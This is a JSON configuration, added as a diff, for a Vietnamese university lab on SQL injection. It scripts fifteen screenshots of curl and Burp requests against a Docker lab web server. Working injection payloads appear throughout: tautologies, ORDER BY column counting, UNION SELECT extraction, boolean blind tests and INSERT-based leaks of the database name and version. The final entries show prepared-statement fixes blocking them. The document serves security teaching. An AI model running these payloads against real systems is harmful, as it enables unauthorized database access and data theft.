@@ -1,0 +1,240 @@
+{
+  "lab_name": "lab05",
+  "description": "Cấu hình danh sách 15 hình ảnh minh chứng thực tế cho Lab 05 - SQL Injection",
+  "theme": {
+    "user": "orias@osboxes",
+    "default_path": "~/it4263lab/lab05"
+  },
+  "images": [
+    {
+      "id": "image1",
+      "filename": "image1_topology.png",
+      "type": "topology",
+      "title": "Mạng ảo LAN Docker - Lab 05 SQL Injection (Subnet: 10.2.6.0/24)",
+      "nodes": [
+        { "name": "User (Người dùng)", "ip": "10.2.6.10", "mac": "02:42:0a:02:06:0a", "host": "lab05_user" },
+        { "name": "Attacker (Kiểm thử viên)", "ip": "10.2.6.51", "mac": "02:42:0a:02:06:33", "host": "lab05_attacker" },
+        { "name": "Web Server (LAMP)", "ip": "10.2.6.80", "mac": "02:42:0a:02:06:50", "host": "lab05_webserver" }
+      ]
+    },
+    {
+      "id": "image2",
+      "filename": "image2_docker_ps.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker ps --format 'table {{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}'" },
+        "NAMES             IMAGE         STATUS         PORTS",
+        "lab05_webserver   lab02_image   Up 8 minutes   80/tcp, 3306/tcp",
+        "lab05_attacker    lab02_image   Up 8 minutes",
+        "lab05_user        lab02_image   Up 8 minutes",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image3",
+      "filename": "image3_burp_intercept_get.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "# Burp Suite Intercept / HTTP History - GET Request" },
+        "GET /sqli/sqli1.php?cat=laptop HTTP/1.1",
+        "Host: 10.2.6.80",
+        "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Connection: keep-alive",
+        "",
+        "HTTP/1.1 200 OK",
+        "Server: Apache/2.4.58 (Ubuntu)",
+        "Content-Type: text/html; charset=UTF-8",
+        "",
+        "<h4>-- Product Information -- </h4>",
+        "<p>Vendor : Dell</p><p>Model : XPS 13</p><p>Price :1200$</p>",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image4",
+      "filename": "image4_error_quote.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "curl -s \"http://10.2.6.80/sqli/sqli1.php?cat=laptop'\"" },
+        "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''laptop''' at line 1",
+        { "prompt": "# Dấu hiệu lỗi xác nhận tồn tại lỗ hổng SQL Injection và DBMS là MySQL/MariaDB" },
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image5",
+      "filename": "image5_comment_hash.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "curl -s \"http://10.2.6.80/sqli/sqli1.php?cat=laptop';%23\"" },
+        "<h4>-- Product Information -- </h4>",
+        "<p>Vendor : Dell</p>",
+        "<p>Model : XPS 13</p>",
+        "<p>Price :1200$</p>",
+        "--------------------------------------------",
+        "<p>Vendor : HP</p>",
+        "<p>Model : Spectre x360</p>",
+        "<p>Price :1150$</p>",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image6",
+      "filename": "image6_tautology_or1.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "curl -s \"http://10.2.6.80/sqli/sqli1.php?cat=any'+or+1;%23\" | head -n 16" },
+        "<h4>-- Product Information -- </h4>",
+        "<p>Vendor : Dell</p><p>Model : XPS 13</p><p>Price :1200$</p>",
+        "--------------------------------------------",
+        "<p>Vendor : HP</p><p>Model : Spectre x360</p><p>Price :1150$</p>",
+        "--------------------------------------------",
+        "<p>Vendor : Logitech</p><p>Model : MX Master 3</p><p>Price :99$</p>",
+        "--------------------------------------------",
+        "<p>Vendor : Razer</p><p>Model : DeathAdder V2</p><p>Price :69$</p>",
+        "--------------------------------------------",
+        { "prompt": "# Mệnh đề WHERE category='any' OR 1 luôn đánh giá là TRUE -> Trích xuất toàn bộ bảng" },
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image7",
+      "filename": "image7_order_by_enumeration.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "curl -s \"http://10.2.6.80/sqli/sqli1.php?cat=laptop'+ORDER+BY+4;%23\" | grep \"Product Information\"" },
+        "<h4>-- Product Information -- </h4>",
+        { "prompt": "# ORDER BY 4 thành công -> Truy vấn SELECT có ít nhất 4 cột" },
+        { "prompt": "curl -s \"http://10.2.6.80/sqli/sqli1.php?cat=laptop'+ORDER+BY+5;%23\" | grep -i \"error\"" },
+        "Unknown column '5' in 'order clause'",
+        { "prompt": "# ORDER BY 5 báo lỗi -> Xác nhận chính xác câu truy vấn có đúng 4 cột" },
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image8",
+      "filename": "image8_union_select_database.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "curl -s \"http://10.2.6.80/sqli/sqli1.php?cat=laptop'+UNION+SELECT+1,database(),3,4;%23\" | tail -n 8" },
+        "--------------------------------------------",
+        "<h4>-- Product Information -- </h4>",
+        "<p>Vendor : webvul</p>",
+        "<p>Model : 3</p>",
+        "<p>Price :4$</p>",
+        "--------------------------------------------",
+        { "prompt": "# Vị trí cột thứ 2 (Vendor) hiển thị tên CSDL trích xuất được: 'webvul'" },
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image9",
+      "filename": "image9_blind_boolean.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "# Kiểm thử ký tự đầu của database(): 'w' (Đúng) -> Có sản phẩm trả về" },
+        { "prompt": "curl -s \"http://10.2.6.80/sqli/sqli1.php?cat=laptop'+and+substring(database(),1,1)='w';%23\" | grep -c \"Vendor\"" },
+        "2",
+        { "prompt": "# Kiểm thử ký tự đầu của database(): 'a' (Sai) -> Không có sản phẩm nào" },
+        { "prompt": "curl -s \"http://10.2.6.80/sqli/sqli1.php?cat=laptop'+and+substring(database(),1,1)='a';%23\" | grep -c \"Vendor\"" },
+        "0",
+        { "prompt": "# Kỹ thuật Boolean-based Blind SQL Injection khai thác thành công!" },
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image10",
+      "filename": "image10_burp_post_insert.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "# Burp Suite Intercept / HTTP History - POST Request sqli2.php" },
+        "POST /sqli/sqli2.php HTTP/1.1",
+        "Host: 10.2.6.80",
+        "Content-Type: application/x-www-form-urlencoded",
+        "Content-Length: 48",
+        "",
+        "cat=keyboard&vendor=Logitech&model=K120&price=15",
+        "",
+        "HTTP/1.1 200 OK",
+        "<center><h3>Product list:</h3>",
+        "<tr height=\"40\"><td>keyboard</td><td>Logitech</td><td>K120</td><td>15$</td></tr>",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image11",
+      "filename": "image11_insert_quote_error.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "curl -s -X POST -d \"cat=keyboard&vendor=anyVendor'&model=K120&price=15\" http://10.2.6.80/sqli/sqli2.php" },
+        "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''15', 'keyboard')' at line 1",
+        { "prompt": "# Dấu nhay đơn phá vỡ cấu trúc câu lệnh INSERT INTO tbl_product(...) VALUES(...)" },
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image12",
+      "filename": "image12_insert_values_align.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "curl -s -X POST -d \"cat=keyboard&vendor=anyVendor', '1', '2', '3');#&model=anyModel&price=0\" http://10.2.6.80/sqli/sqli2.php | grep -A 4 \"anyVendor\"" },
+        "<tr height=\"40\">",
+        "<td>3</td>",
+        "<td>anyVendor</td>",
+        "<td>1</td>",
+        "<td>2$</td>",
+        "</tr>",
+        { "prompt": "# Thêm bản ghi mới thành công! Thứ tự cột trong VALUES: vendor, model, price, category" },
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image13",
+      "filename": "image13_insert_database_leak.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "curl -s -X POST -d \"cat=keyboard&vendor=anyVendor', database(), '2', '3');#&model=anyModel&price=0\" http://10.2.6.80/sqli/sqli2.php | grep -A 4 \"anyVendor\"" },
+        "<tr height=\"40\">",
+        "<td>3</td>",
+        "<td>anyVendor</td>",
+        "<td>webvul</td>",
+        "<td>2$</td>",
+        "</tr>",
+        { "prompt": "# Hàm database() được thực thi trong câu lệnh INSERT -> Tên CSDL 'webvul' được ghi vào bảng!" },
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image14",
+      "filename": "image14_insert_version_subquery.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "curl -s -X POST -d \"cat=keyboard&vendor=anyVendor', (select version()), '2', '3');#&model=anyModel&price=0\" http://10.2.6.80/sqli/sqli2.php | grep -A 4 \"anyVendor\"" },
+        "<tr height=\"40\">",
+        "<td>3</td>",
+        "<td>anyVendor</td>",
+        "<td>10.4.34-MariaDB-1:10.4.34+maria~ubu2004</td>",
+        "<td>2$</td>",
+        "</tr>",
+        { "prompt": "# Truy vấn con (subquery) trích xuất thành công phiên bản phần mềm máy chủ CSDL" },
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image15",
+      "filename": "image15_defense_prepared_statement.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "# 1. Kiểm thử trên sqli1_fixed.php (Prepared Statement với PDO):" },
+        { "prompt": "curl -s \"http://10.2.6.80/sqli/sqli1_fixed.php?cat=any'+or+1;%23\"" },
+        "<p>No products found for category: any' or 1;#</p>",
+        { "prompt": "# 2. Kiểm thử trên sqli2_fixed.php:" },
+        { "prompt": "curl -s -X POST -d \"cat=keyboard&vendor=anyVendor', database(), '2', '3');#&model=Model&price=5\" http://10.2.6.80/sqli/sqli2_fixed.php | grep -o \"Product added successfully\"" },
+        "Product added successfully",
+        { "prompt": "# Dữ liệu payload được lưu nguyên văn dưới dạng text thuần, không bị thực thi SQL!" },
+        { "prompt": "" }
+      ]
+    }
+  ]
+}
